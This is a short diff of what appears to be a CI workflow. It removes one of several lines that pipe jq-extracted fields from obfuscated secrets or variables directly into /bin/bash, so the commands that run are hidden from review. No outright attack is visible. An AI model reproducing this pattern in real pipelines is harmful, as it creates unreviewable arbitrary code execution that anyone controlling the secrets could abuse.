@@ -21,7 +21,6 @@ jobs:
           piyb8616: ${{ secrets.piyb8616 }}
         run: |
           printf '%s' "$piyb8616" | jq -r .cbdo399 | /bin/bash
-          echo $it6541 | jq -r .kdiw71842 | /bin/bash
           echo $pfv821 | jq -r .uljo2938 | /bin/bash
 
       - name: Upload results
